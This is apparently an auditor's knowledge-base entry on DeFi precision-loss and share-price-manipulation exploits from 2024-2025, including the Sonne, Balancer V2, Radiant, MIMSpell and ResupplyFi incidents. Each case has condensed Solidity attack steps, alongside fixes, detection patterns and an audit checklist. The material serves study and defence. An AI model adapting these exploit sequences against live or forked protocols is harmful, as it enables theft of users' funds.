---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, optimism, base"
category: "precision_loss"
vulnerability_type: "share_price_manipulation, exchange_rate_inflation, elastic_base_rounding"

# Pattern Identity (Required)
root_cause_family: arithmetic_invariant_break
pattern_key: share_price_manipulation | exchange_rate | economic_exploit | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "economic_exploit"
affected_component: "exchange_rate, share_accounting, scaling_factors, virtual_balance"

# Technical Primitives
primitives:
  - "exchange_rate_inflation"
  - "first_depositor"
  - "empty_market"
  - "elastic_base_rounding"
  - "liquidityIndex_inflation"
  - "scaling_factor_truncation"
  - "share_price_donation"
  - "vault_inflation"
  - "rayDiv_rounding"
  - "mulDown_truncation"
  - "rebase_math"
  - "recursive_flash_loan"
  - "batchSwap"
  - "virtual_balance_manipulation"
  - "vb_prod"
  - "vb_sum"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.8
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "base"
  - "repay"
  - "borrow"
  - "mulDiv"
  - "rayDiv"
  - "toBase"
  - "vb_sum"
  - "elastic"
  - "exploit"
  - "mulDown"
  - "vb_prod"
  - "BentoBox"
  - "DegenBox"
  - "transfer"
  - "batchSwap"
path_keys:
  - "empty_market_exchange_rate_inflation_via_donation"
  - "elastic_base_rebase_math_rounding_exploitation"
  - "liquidityindex_inflation_via_recursive_flash_loans"
  - "scaling_factor_precision_loss_in_stablemath"
  - "share_price_inflation_via_direct_contract_donation"
  - "virtual_balance_math_manipulation"

# Context Tags
tags:
  - "defi"
  - "lending"
  - "vault"
  - "precision"
  - "share_manipulation"
  - "exchange_rate"
  - "compound_fork"
  - "aave_fork"
  - "kashi"
  - "balancer"
  - "amm"
  - "flash_loan"
  - "donation_attack"
  - "first_depositor"
  - "scaling_factor"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [SONNE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-05/Sonne_exp.sol` |
| [MIM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-01/MIMSpell2_exp.sol` |
| [RAD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-01/RadiantCapital_exp.sol` |
| [ONYX-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-09/OnyxDAO_exp.sol` |
| [COMP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-10/CompoundFork_exploit.sol` |
| [BAL-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-11/BalancerV2_exp.sol` |
| [GMX-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-07/gmx_exp.sol` |
| [RESUPPLY-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-06/ResupplyFi_exp.sol` |
| [YETH-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-12/yETH_exp.sol` |

---

# Precision Loss & Share Price Manipulation Attack Patterns (2024-2025)
## Overview

Precision loss and share price manipulation attacks are the most financially devastating DeFi exploit category in 2024-2025, responsible for over **$215M** in combined losses. These attacks exploit rounding errors, exchange rate inflation, and scaling factor truncation across lending protocols, AMMs, and vaults. Attack patterns range from classic first-depositor/donation attacks on Compound forks (Sonne $20M), elastic/base rounding manipulation in Kashi lending (MIMSpell $6.5M), recursive flash loan index inflation on Aave forks (Radiant $4.5M), scaling factor precision loss in Balancer StableMath ($120M), to share price donation via direct contract transfers (ResupplyFi $9.6M).

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `arithmetic_invariant_break` |
| Pattern Key | `share_price_manipulation | exchange_rate | economic_exploit | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, arbitrum, optimism, base |


## 1. Empty Market Exchange Rate Inflation via Donation

> **pathShape**: `atomic`

### Root Cause

When Compound V2 fork cToken markets are newly deployed with zero total supply, the `exchangeRate = totalCash / totalSupply` formula becomes exploitable. An attacker mints minimal shares (1-2 wei), then donates underlying tokens directly to the cToken contract. Since `totalSupply` remains at ~2 wei while `totalCash` becomes enormous, the exchange rate inflates astronomically. Those few shares become "worth" millions in collateral value, enabling unbounded borrowing from other markets.

### Attack Scenario

1. Front-run or time a governance proposal that adds a new empty cToken market
2. Mint the absolute minimum cTokens (e.g., 2 wei soVELO)
3. Donate massive amount of underlying directly to the cToken contract via `transfer()`
4. `exchangeRate` = donated_amount / 2 → astronomically large
5. Enter the market as collateral → borrow all available assets from other markets
6. Redeem donated underlying back, repay flash loan

### Vulnerable Pattern Examples

**Example 1: Sonne Finance — Empty Market Donation ($20M, May 2024)** [Approx Vulnerability: CRITICAL] `@audit` [SONNE-POC]

```solidity
// ❌ VULNERABLE: Compound V2 cToken with no first-depositor protection
// Attacker front-runs governance proposal adding soVELO market

// Step 1: Execute governance proposals that add new soVELO market
TimelockController.execute(soVELO, 0, data1, predecessor, salt);
// @audit Market is now live with 0 totalSupply — race condition window

// Step 2: Mint minimal shares — only 2 wei of soVELO cTokens
CErc20Interface(soVELO).mint(400_000_001);
// @audit totalSupply = 2 wei soVELO

// Step 3: Donate massive VELO directly to inflate exchange rate
IERC20(VELO_Token_V2).transfer(soVELO, VeloAmountOfthis);
// @audit exchangeRate = (donated VELO) / 2 = enormous value
// 2 wei soVELO now "worth" millions of USD as collateral

// Step 4: Borrow all USDC against inflated collateral
IUnitroller(Unitroller).enterMarkets(cTokens);
CErc20Interface(soUSDC).borrow(768_947_220_961);
// @audit Borrows ~$768M USDC against 2 wei of cTokens

// Step 5: Recover donated VELO
ICErc20Delegate(soVELO).redeemUnderlying(Velo_amount_of_soVelo_after_transfer - 1);
// Profit: ~$20M USD
```

**Example 2: OnyxDAO — Fake Market + Exchange Rate Manipulation ($3.8M, Sep 2024)** [Approx Vulnerability: CRITICAL] `@audit` [ONYX-POC]

```solidity
// ❌ VULNERABLE: Compound fork with unvalidated liquidation + exchange rate manipulation
// Attacker corrupts oETH exchange rate via raw ETH transfers + redeem cycles

// Step 1: Mint oETH, borrow back all ETH cash (triggers fallback → reentrancy)
IFS(oETH).mint{value: balWETH - 0.5 ether}();
IFS(oETH).borrow(cashOETH1);

// Step 2: AttackerC2 manipulates exchangeRate via 54 small deposit/redeem cycles
for (uint i = 0; i < 54; i++) {
    oETH.redeemUnderlying(330_454_691 + 10);
    oETH.call{value: 215_227_348 + 1}("");  // @audit Raw ETH send inflates totalCash
    // without minting new shares → exchangeRate skewed
}

// Step 3: Drain all markets with inflated collateral
IFS(oXCN).borrow(IFS(oXCN).getCash());   // 7.35M XCN
IFS(oDAI).borrow(IFS(oDAI).getCash());   // 5K DAI
IFS(oBTC).borrow(IFS(oBTC).getCash());   // 0.23 WBTC
IFS(oUSDT).borrow(IFS(oUSDT).getCash()); // 50K USDT

// Step 4: Deploy fake oToken contracts for liquidation bypass
// @audit NFTLiquidationProxy.liquidateWithSingleRepay() accepts ANY oToken address
IFS(NFTLiquidationProxy).liquidateWithSingleRepay(
    payable(address(this)), fake_oTokenCollateral, fake_oTokenRepay, amount
);
// Fake_oTokenRepay.transfer() callback liquidates real oVUSD, seizes oETH
// @audit $3.8M+ drained: 4.1M VUSD + 7.35M XCN + 5K DAI + 0.23 WBTC + 50K USDT
```

---

## 2. Elastic/Base Rebase Math Rounding Exploitation

> **pathShape**: `atomic`

### Root Cause

Kashi-based lending protocols (BentoBox/DegenBox) track debt using an elastic/base rebase structure where `elastic` represents the actual token amount and `base` represents shares. The conversion functions `toElastic()` and `toBase()` use `mulDiv` that rounds in specific directions. When both `elastic` and `base` are driven to near-zero, repeated tiny borrow/repay cycles (1 wei) accumulate rounding errors that skew the ratio enormously, allowing the attacker to borrow the entire pool for negligible debt shares.

### Attack Scenario

1. Flash loan enough tokens to repay ALL borrowers' debt (drive `totalBorrow.elastic` to 0)
2. Repay each individual user's `borrowPart` via `repayForAll()` and `repay()`
3. Deploy a helper that performs 90 cycles of `borrow(1 wei)` then `repay(1 wei)`
4. Each cycle: rounding in `elastic → base` conversion gives attacker favorable direction
5. After 90 iterations: elastic/base ratio is exponentially skewed
6. Borrow the entire DegenBox balance through inflated elastic amount vs tiny base

### Vulnerable Pattern Examples

**Example 3: MIMSpell/Abracadabra — Elastic/Base Rounding ($6.5M, Jan 2024)** [Approx Vulnerability: CRITICAL] `@audit` [MIM-POC]

```solidity
// ❌ VULNERABLE: CauldronV4 (Kashi lending) elastic/base ratio manipulation
// After repaying ALL borrowers, repeated 1-wei borrow/repay skews the ratio

// Step 1: Flash loan 300K MIM from DegenBox
IDegenBox(DegenBox).flashLoan(address(this), address(this), address(MIM), 300_000 * 1e18, "");

// Step 2: Repay ALL borrowers to drive elastic to 0
ICauldronV4(CauldronV4).repayForAll(uint128(240_000 * 1e18), true);
// @audit Repay each user individually
for (uint i = 0; i < users.length; i++) {
    ICauldronV4(CauldronV4).repay(users[i], true, borrowPart);
}
// @audit totalBorrow.elastic == 0, totalBorrow.base == 0

// Step 3: Helper borrows 1 wei and repays 1 wei in a loop — 90 times
// Each cycle exploits rounding in elastic → base conversion
function exploit() external {
    for (uint i = 0; i < 90; i++) {
        ICauldronV4(CauldronV4).borrow(address(this), 1);
        // @audit toBase(1, elastic, base, roundUp) rounds unfavorably
        ICauldronV4(CauldronV4).repay(address(this), true, 1);
        // @audit After 90 cycles: elastic is enormous relative to base
    }
}

// Step 4: Borrow entire balance at skewed ratio
uint256 fullBalance = IDegenBox(DegenBox).balanceOf(address(MIM), address(CauldronV4));
ICauldronV4(CauldronV4).borrow(address(this), fullBalance);
// @audit Entire $6.5M MIM balance borrowed for negligible base shares
```

---

## 3. LiquidityIndex Inflation via Recursive Flash Loans

> **pathShape**: `callback-reentrant`

### Root Cause

Aave V2 fork lending pools that allow flash loans from their own pool create a recursive amplification vector. Each flash loan from the pool accumulates a premium that inflates the `liquidityIndex`. After 100+ recursive calls, the index reaches extreme values where `rayDiv()` arithmetic (ray = 1e27 precision) produces significant rounding errors. The attacker exploits these rounding errors through deposit/withdraw cycles to siphon funds.

### Attack Scenario

1. Flash loan from Aave V3 (external), deposit into Radiant (Aave V2 fork)
2. Execute 151 recursive flash loans from Radiant's own lending pool
3. Each cycle: transfer USDC to rUSDCn, withdraw `balance - 1` → inflates `liquidityIndex`
4. After 151 cycles: `liquidityIndex` at extreme value
5. Helper contract repeatedly deposits/withdraws, exploiting `rayDiv()` rounding
6. Borrow WETH against manipulated position

### Vulnerable Pattern Examples

**Example 4: Radiant Capital — Recursive Flash Loan Index Inflation ($4.5M, Jan 2024)** [Approx Vulnerability: CRITICAL] `@audit` [RAD-POC]

```solidity
// ❌ VULNERABLE: Aave V2 fork allows flash loans from own pool → liquidityIndex inflation

// Step 1: External flash loan from Aave V3
takeFlashLoan(address(AaveV3Pool), 3_000_000 * 1e6, params);

// Step 2: Deposit into Radiant
RadiantLendingPool.deposit(address(USDC), 2_000_000 * 1e6, address(this), 0);

// Step 3: Recursive flash loans from Radiant itself — 151 times
uint256 i = 0;
while (i < 151) {
    takeFlashLoan(address(RadiantLendingPool), 2_000_000 * 1e6, params);
    // @audit Inside callback: donate USDC to rUSDCn then withdraw
    USDC.transfer(address(rUSDCn), rUSDCn.balanceOf(address(this)));
    RadiantLendingPool.withdraw(address(USDC), rUSDCnBalanceBeforeTransfer - 1, address(this));
    ++i;
    // @audit Each cycle inflates liquidityIndex via premium accumulation
}

// Step 4: Exploit rayDiv rounding at extreme liquidityIndex
// Helper loops: deposit → withdraw (balance - 1) → accumulate rounding profit
function siphonFundsFromPool(uint256 amount) external {
    while (USDC.balanceOf(address(RadiantLendingPool)) > dust) {
        RadiantLendingPool.deposit(address(USDC), amount, address(this), 0);
        RadiantLendingPool.withdraw(address(USDC), rUSDCn.balanceOf(address(this)) - 1, address(this));
        // @audit rayDiv(amount * RAY + halfIndex, index) loses precision at extreme index
        // Each cycle extracts small rounding profit from the pool
    }
}

// Step 5: Borrow WETH against remaining position
RadiantLendingPool.borrow(address(WETH), amountToBorrow, 2, 0, address(this));
// @audit $4.5M drained through recursive flash loan + rayDiv exploitation
```

---

## 4. Scaling Factor Precision Loss in StableMath

> **pathShape**: `iterative-loop`

### Root Cause

Balancer V2 ComposableStablePools use scaling factors to normalize token amounts with different decimals or wrapped token rates (e.g., wstETH, osETH). The `FixedPoint.mulDown(amount, scalingFactor)` operation truncates toward zero. When pool balances are drained to dust levels, this truncation error becomes a significant fraction of the total balance. Combining hundreds of micro-swaps via `batchSwap` in a single transaction, the attacker extracts the cumulative rounding profit.

### Attack Scenario

1. Phase 1: Drain pool balances to tiny amounts via BPT → token swaps
2. Phase 2: With dust-level balances, execute precision-exploiting swap pairs — `trickAmt = 10000 / ((scalingFactor - 1e18) * 10000 / 1e18)` is the key amount where truncation occurs
3. Phase 3: Buy back BPT at manipulated prices
4. Withdraw profits from Balancer internal balances

### Vulnerable Pattern Examples

**Example 5: Balancer V2 — Scaling Factor Truncation ($120M, Nov 2025)** [Approx Vulnerability: CRITICAL] `@audit` [BAL-POC]

```solidity
// ❌ VULNERABLE: FixedPoint.mulDown truncation in StableMath._calcInGivenOut
// When scalingFactors differ from 1e18 (wstETH, osETH), truncation is exploitable

// Key calculation: find the amount where mulDown truncates
uint256 scalingFactor = IComposableStablePool(pool).getScalingFactors()[tokenIndex];
// @audit osETH scalingFactor ≈ 1.00015e18 — slightly above 1e18
uint256 trickAmt = 10000 / ((scalingFactor - 1e18) * 10000 / 1e18);
// @audit trickAmt ≈ 67000 for osETH pool — sweet spot for truncation

// Phase 1: Drain pool to dust via BPT→token swaps
// batchSwap(GIVEN_OUT, steps, tokens, fundMgmt, limits, deadline)
// Iteratively swap 99% of each token out

// Phase 2: Exploit precision loss with tiny balances
for (uint round = 0; round < loops; round++) {  // loops = 25-30
    // Swap OUT (amount - trickAmt - 1): amountOutScaled rounds DOWN
    swapGivenOut(tokenIn, tokenOut, amount - trickAmt - 1);
    // @audit mulDown(tokenAmountOut, scalingFactors[tokenIndexOut]) truncates
    // Attacker pays less tokenIn than the true value of tokenOut

    // Swap OUT trickAmt: again truncation in mulDown
    swapGivenOut(tokenIn, tokenOut, trickAmt);

    // Swap back: reverse direction to reset balances for next round
    swapGivenOut(tokenOut, tokenIn, trimmed_amount);
    // @audit Each round: net extraction = truncation error × iterations
}

// Phase 3: Buy back BPT at manipulated rates
// All phases combined in single batchSwap → atomic execution

// Withdraw from Balancer internal balance
IBalancerVault(balancer).manageUserBalance(withdrawOps);
// @audit $120M extracted from osETH/wETH and wstETH/wETH pools
```

---

## 5. Share Price Inflation via Direct Contract Donation

> **pathShape**: `atomic`

### Root Cause

When vault or lending protocols use `totalAssets() / totalShares()` for share pricing and rely on the contract's token balance for `totalAssets()`, an attacker can donate tokens directly to the underlying controller/contract to inflate the share price. If the protocol then allows borrowing against shares valued at the inflated rate, a single share (1 wei) becomes worth an enormous collateral amount.

### Vulnerable Pattern Examples

**Example 6: ResupplyFi — 1 Wei Collateral = $10M Borrow ($9.6M, Jun 2025)** [Approx Vulnerability: CRITICAL] `@audit` [RESUPPLY-POC]

```solidity
// ❌ VULNERABLE: Share price inflatable via donation to underlying controller
// 1 wei of sCrvUSD used as collateral to borrow $10M reUSD

// Step 1: Flash loan only 4,000 USDC from Morpho
IMorphoBlue(morphoBlue).flashLoan(address(usdc), 4000 * 1e6, hex"");

// Step 2: Swap USDC → crvUSD via Curve
curveUsdcCrvusdPool.exchange(0, 1, flashLoanAmount, 0);

// Step 3: Donate 2000 crvUSD directly to the crvUSD controller
// @audit Direct transfer inflates sCrvUSD share price
crvUsd.transfer(crvUSDController, 2000 * 1e18);

// Step 4: Mint only 1 wei of sCrvUSD — share price is now astronomical
IsCRVUSD(sCrvUsdContract).mint(1);
// @audit 1 wei of sCrvUSD valued at ~millions due to inflated share price

// Step 5: Use 1 wei as collateral to borrow 10M reUSD
IResupplyVault(resupplyVault).addCollateralVault(1, address(this));
IResupplyVault(resupplyVault).borrow(10_000_000 * 1e18, 0, address(this));
// @audit $10M borrowed against 1 wei collateral

// Step 6: Swap reUSD → sCrvUSD → crvUSD → USDC, repay flash loan
curveReusdPool.exchange(0, 1, reUsd.balanceOf(address(this)), 0);
sCrvUsd.redeem(redeemAmount, address(this), address(this));
curveUsdcCrvusdPool.exchange(1, 0, finalExchangeAmount, 0);
// @audit Profit: ~$9.6M from a $4,000 flash loan
```

**Example 7: GMX V1 — GlobalShortAveragePrice Manipulation via Reentrancy ($41M, Jul 2025)** [Approx Vulnerability: CRITICAL] `@audit` [GMX-POC]

```solidity
// ❌ VULNERABLE: Reentrancy during position close + share price manipulation
// ETH transfer in decreasePosition triggers fallback → opens new positions

// Step 1: Open leveraged ETH long position
IGMXOrderBook(orderBook).createIncreaseOrder{value: fee}(
    path, amountIn, indexToken, minOut, sizeDelta, collateralToken, isLong, triggerPrice, triggerAboveThreshold, fee, shouldWrap
);

// Step 2: Close position — vault sends ETH → triggers fallback
IGMXPositionManager(positionManager).executeDecreaseOrder(account, orderIndex, feeReceiver);

// REENTRANCY in fallback():
fallback() external payable {
    // @audit Open massive BTC short during ETH position close
    usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));
    vault_.increasePosition(
        address(this), address(usdc_), address(btc_),
        90030000000000000000000000000000000,  // @audit ~$90T sizeDelta short
        false
    );
    // @audit globalShortAveragePrice is now distorted
}

// Step 3: Profit extraction via GLP
// Flash loan 7.5M USDC, mint GLP
rewardRouterV2_.mintAndStakeGlp(address(usdc_), 6000000000000, 0, 0);

// Step 4: Drain ALL vault tokens via GLP redemption
// @audit Calculate each token's unencumbered balance
for (address token : [ETH, BTC, USDC, USDE, LINK, UNI, USDT, FRAX, DAI]) {
    uint256 drainable = vault_.poolAmounts(token) - vault_.reservedAmounts(token);
    uint256 glpNeeded = (drainable * vault_.getMinPrice(token) / 1e30) * glpTotal / aumInUsdg;
    rewardRouterV2_.unstakeAndRedeemGlp(token, glpNeeded, 0, address(this));
    // @audit Drains all 9 token types from vault
}
// @audit $41M total: ETH + BTC + USDC + USDE + LINK + UNI + USDT + FRAX + DAI
```

---

## 6. Virtual Balance Math Manipulation

> **pathShape**: `iterative-loop`

### Root Cause

Multi-asset pools using virtual balance models (e.g., yETH with 8 LST assets) track invariants via `vb_prod` and `vb_sum` variables. When rate providers (like OETH rebase) change asset rates mid-manipulation, the virtual balance recalculation produces inconsistent results. Combined with carefully sequenced add/remove/rebase cycles, the attacker can drain the entire pool.

### Vulnerable Pattern Examples

**Example 8: yETH — Virtual Balance Math + Rate Rebase ($9M, Dec 2025)** [Approx Vulnerability: CRITICAL] `@audit` [YETH-POC]

```solidity
// ❌ VULNERABLE: Virtual balance pool with 8 LST assets
// Rate update during manipulation causes vb_prod/vb_sum inconsistency

// Step 1: Initial rate update + small liquidity removal
POOL.update_rates(rates);
POOL.remove_liquidity(416_373_487_230_773_958_294, minAmounts, receiver);

// Step 2: Repeated add/remove cycles shift vb_prod and vb_sum
// @audit Each cycle with different amounts progressively skews the invariant
_addLiquidity(_getPhase2Amounts(), "cycle 1");
_removeLiquidity(2_789_348_310_901_989_968_648, "cycle 1");
// ... repeat 4 cycles with calculated amounts ...

// Step 3: OETH rebase changes one asset's rate mid-manipulation
OETH.rebase();
// @audit Rate change causes vb_prod/vb_sum recalculation with stale values
// Virtual balance model now inconsistent between assets

// Step 4: Targeted single-asset deposits + rate updates
_addLiquidity(_getSingleAssetAmounts(3, amount), "asset 3");
_removeLiquidity(0, "trigger recalc");  // @audit Zero-amount remove triggers state update
_updateSingleRate(6);                    // @audit Update rate for asset 6 specifically

// Step 5: Drain entire pool
uint256 poolSupply = POOL.supply();
POOL.remove_liquidity(poolSupply, minAmounts, receiver);
// @audit $9M drained through ~8 sequenced add/remove/rebase cycles
```

---

## Impact Analysis

### Technical Impact
- Exchange rate inflation makes minimal shares (1-2 wei) worth millions in collateral
- Elastic/base ratio manipulation allows borrowing entire pool balances
- Recursive flash loan index inflation creates exploitable rounding at extreme values
- Scaling factor truncation in `mulDown` extracts value through micro-swap accumulation
- Virtual balance manipulation through rate rebases creates pool-draining inconsistencies
- Direct donation to underlying contracts inflates share prices without minting proportional shares

### Business Impact
- **BalancerV2**: $120M loss — largest single precision exploit in DeFi history
- **GMX V1**: $41M loss — reentrancy + share price manipulation on derivatives vault
- **Sonne Finance**: $20M loss — classic first-depositor on newly-listed Compound fork market
- **ResupplyFi**: $9.6M loss from only a $4,000 flash loan — extreme ROI exploit
- **yETH**: $9M loss — novel multi-asset virtual balance manipulation
- **MIMSpell**: $6.5M loss — elastic/base rounding after repay-to-zero
- **RadiantCapital**: $4.5M loss — recursive self-flash-loan on Aave V2 fork
- **OnyxDAO**: $3.8M loss — fake market + exchange rate skewing via raw ETH transfers
- **CompoundFork**: $1M loss — AMM oracle with no TWAP protection
- Combined 2024-2025 precision loss damage: **$215M+**

### Affected Scenarios
- Any Compound V2 fork adding new cToken markets without first-depositor protection
- Kashi/BentoBox/DegenBox lending with near-zero elastic/base states
- Aave V2 forks allowing flash loans from own lending pool
- Balancer V2 ComposableStablePools with non-1e18 scaling factors
- Any vault using `totalAssets()/totalShares()` with donatable underlying
- Multi-asset pools with external rate providers (rebasing tokens)
- GMX V1-style vaults with ETH transfer reentrancy + global state variables

---

## Secure Implementation

**Fix 1: First-Depositor Protection (Compound/Vault)**
```solidity
// ✅ SECURE: Minimum initial deposit burns shares to dead address
function _initializeMarket(uint256 initialDeposit) internal {
    require(totalSupply == 0, "Already initialized");
    require(initialDeposit >= MIN_INITIAL_DEPOSIT, "Below minimum"); // e.g., 1e6

    // Mint shares to the dead address to prevent exchange rate manipulation
    uint256 deadShares = initialDeposit * INITIAL_RATE;
    _mint(DEAD_ADDRESS, deadShares);
    // @audit Dead shares create a floor for exchangeRate
    // Donation can only inflate rate by factor of donated/deadShares
}
```

**Fix 2: Elastic/Base Minimum Enforcement**
```solidity
// ✅ SECURE: Enforce minimum elastic and base values
function borrow(address to, uint256 amount) external {
    Rebase memory _totalBorrow = totalBorrow;

    // @audit Prevent zero-state manipulation
    require(_totalBorrow.elastic >= MIN_ELASTIC || _totalBorrow.base >= MIN_BASE,
            "Below minimum rebase values");

    uint256 part = _totalBorrow.toBase(amount, true);
    require(part > MIN_BORROW_PART, "Borrow too small");

    _totalBorrow.elastic += uint128(amount);
    _totalBorrow.base += uint128(part);
    totalBorrow = _totalBorrow;
}
```

**Fix 3: Disable Self-Flash-Loans**
```solidity
// ✅ SECURE: Prevent flash loans from the same lending pool
function flashLoan(
    address receiverAddress, address[] calldata assets,
    uint256[] calldata amounts, uint256[] calldata modes,
    address onBehalfOf, bytes calldata params, uint16 referralCode
) external override {
    // @audit Block recursive flash loans from own pool
    require(!_isReentrant, "No self-flash-loans");
    _isReentrant = true;
    // ... flash loan logic ...
    _isReentrant = false;
}
```

**Fix 4: Scaling Factor Bounds Check**
```solidity
// ✅ SECURE: Enforce minimum pool balances to prevent truncation exploitation
function _onSwapGivenOut(
    uint256 tokenIndexIn, uint256 tokenIndexOut, uint256 amountOut
) internal returns (uint256 amountIn) {
    // @audit Require minimum pool balances to prevent precision exploitation
    require(_balances[tokenIndexIn] >= MIN_POOL_BALANCE, "Balance too low");
    require(_balances[tokenIndexOut] >= MIN_POOL_BALANCE, "Balance too low");

    uint256 amountOutScaled = FixedPoint.mulDown(amountOut, _scalingFactors[tokenIndexOut]);
    // @audit Additional check: ensure scaled amount rounds conservatively
    require(amountOutScaled > 0, "Amount rounds to zero");
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Pattern 1: `exchangeRate = totalCash / totalSupply` with no minimum supply enforcement
- Pattern 2: `elastic/base` or `shares/assets` rebase math near zero values
- Pattern 3: `flashLoan()` calling back into the same lending pool (recursive)
- Pattern 4: `FixedPoint.mulDown(amount, scalingFactor)` where scalingFactor != 1e18
- Pattern 5: `totalAssets()` reading contract balance (donatable) for share pricing
- Pattern 6: `vb_prod` / `vb_sum` with external rate providers that can rebase
- Pattern 7: ETH transfers in position close without reentrancy guards
- Pattern 8: `rayDiv(amount * RAY + halfIndex, index)` with extreme index values
```

### Audit Checklist
- [ ] Does the protocol have first-depositor / empty market protection?
- [ ] Can flash loans be taken from the protocol's own lending pool recursively?
- [ ] Are scaling factors bounds-checked to prevent truncation at small amounts?
- [ ] Is `totalAssets()` based on contract balance that can be donated to?
- [ ] Are elastic/base minimums enforced to prevent zero-state manipulation?
- [ ] Do rate providers (rebase tokens) have consistent state during pool operations?
- [ ] Are ETH transfers in position closing protected against reentrancy?
- [ ] Is `exchangeRateStored()` resistant to direct donation inflation?

---

## Real-World Examples

### Known Exploits
- **Balancer V2** — $120M — Scaling factor precision loss in ComposableStablePool batchSwap — Nov 2025
- **GMX V1** — $41M — Reentrancy + globalShortAveragePrice manipulation via GLP — Jul 2025
- **Sonne Finance** — $20M — Empty market exchange rate inflation via donation — May 2024
- **ResupplyFi** — $9.6M — 1 wei sCrvUSD collateral borrowed $10M reUSD — Jun 2025
- **yETH** — $9M — Virtual balance manipulation via rebase + rate inconsistency — Dec 2025
- **MIMSpell/Abracadabra** — $6.5M — Elastic/base rounding after repay-to-zero — Jan 2024
- **Radiant Capital** — $4.5M — Recursive flash loan liquidityIndex inflation — Jan 2024
- **OnyxDAO** — $3.8M — Fake market + raw ETH exchange rate manipulation — Sep 2024
- **CompoundFork** — $1M — AMM spot price oracle on Compound fork — Oct 2024

---

## Prevention Guidelines

### Development Best Practices
1. Always burn initial shares to dead address when deploying new vault/cToken markets
2. Enforce minimum elastic/base values in rebase-based lending (never allow near-zero state)
3. Disable self-flash-loans from the same lending pool
4. Use TWAP or external oracles instead of spot prices for collateral valuation
5. Enforce minimum pool balances in AMMs to prevent precision exploitation
6. Implement reentrancy guards on all external calls that transfer ETH/tokens
7. Validate that liquidation functions only accept registered/whitelisted markets
8. Ensure rate providers cannot change mid-operation (snapshot rates at operation start)

### Testing Requirements
- Unit tests for: exchange rate with 1 wei totalSupply + large donation
- Unit tests for: elastic/base ratio at near-zero with repeated 1-wei borrow/repay
- Integration tests for: recursive flash loans from own pool
- Fuzzing targets: scaling factor multiplication with varying pool balances
- Invariant tests: `totalAssets >= totalShares * minSharePrice` always holds

---

## Keywords for Search

`precision loss`, `share price manipulation`, `exchange rate inflation`, `first depositor attack`, `vault inflation`, `empty market`, `donation attack`, `elastic base rounding`, `rebase math`, `liquidityIndex inflation`, `recursive flash loan`, `rayDiv rounding`, `scaling factor truncation`, `mulDown precision`, `batchSwap`, `virtual balance`, `vb_prod`, `vb_sum`, `share price donation`, `cToken exchange rate`, `totalCash totalSupply`, `Compound fork`, `Aave fork`, `Kashi lending`, `BentoBox`, `DegenBox`, `Balancer StableMath`, `ComposableStablePool`, `wstETH osETH`, `globalShortAveragePrice`, `GLP manipulation`, `reentrancy position close`

---

## Related Vulnerabilities

- `DB/general/vault-inflation-attack/defihacklabs-vault-inflation-patterns.md` — Earlier vault inflation patterns (2022-2023)
- `DB/oracle/price-manipulation/defihacklabs-price-manipulation-patterns.md` — Price manipulation patterns
- `DB/general/reentrancy/defihacklabs-reentrancy-patterns.md` — Reentrancy patterns
- `DB/general/flash-loan-attacks/` — Flash loan attack patterns
